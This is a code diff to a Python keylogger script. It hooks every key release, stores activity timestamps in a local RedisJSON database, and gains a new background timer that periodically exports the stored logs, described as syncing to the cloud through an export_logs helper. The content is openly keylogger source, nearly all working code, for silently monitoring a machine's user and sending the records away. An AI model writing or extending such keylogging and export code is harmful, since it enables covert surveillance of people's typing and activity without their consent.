@@ -4,27 +4,24 @@ import keyboard
 from threading import Timer
 from datetime import datetime
 from rejson import Client, Path
+from request_service import export_logs
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
-redis = Client(host="localhost", port=6379)
+redis = Client(host="localhost", port=6379, decode_responses=True)
 hostname = socket.gethostname()
 
 data = {
-    'host': hostname,
-    'status': [
-        {
-            'datetime': datetime.now().__str__(),
-            'activity': "inactive",
-        }
-    ]
+    'hostname': hostname,
+    'logs': []
 }
 
 
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, sync_to_cloud):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
+        self.sync_to_cloud = sync_to_cloud
         # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
@@ -59,16 +56,16 @@ class Keylogger:
     def send_to_redis(self):
         if (self.log != ''):
             obj = {
-                "datetime": datetime.now().__str__(),
-                'activity': "active",
+                "dateTime": datetime.now().strftime("%Y-%m-%d %H:%M:%S").__str__(),
+                'activity': "ACTIVE",
             }
-            redis.jsonarrappend('test', Path('.status'), obj)
+            redis.jsonarrappend('log', Path('.logs'), obj)
         else:
             obj = {
-                "datetime": datetime.now().__str__(),
-                'activity': "inactive",
+                "dateTime": datetime.now().strftime("%Y-%m-%d %H:%M:%S").__str__(),
+                'activity': "INACTIVE",
             }
-            redis.jsonarrappend('test', Path('.status'), obj)
+            redis.jsonarrappend('log', Path('.logs'), obj)
 
     def report(self):
         """
@@ -89,14 +86,25 @@ class Keylogger:
         # start the timer
         timer.start()
 
+    def send_to_cloud(self):
+        data = redis.jsonget('log', Path.rootPath())
+        export_logs(data)
+        sync_timer = Timer(interval=self.sync_to_cloud, function=self.send_to_cloud)
+        # set the thread as daemon (dies when main thread die)
+        sync_timer.daemon = True
+        # start the timer
+        sync_timer.start()
+
+
     def start(self):
         # record the start datetime
-        redis.jsonset('test', Path.rootPath(), data)
+        redis.jsonset('log', Path.rootPath(), data)
         self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(callback=self.callback)
         # start reporting the keylogs
         self.report()
+        self.send_to_cloud()
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
@@ -106,5 +114,5 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=10)
+    keylogger = Keylogger(interval=10, sync_to_cloud=30)
     keylogger.start()
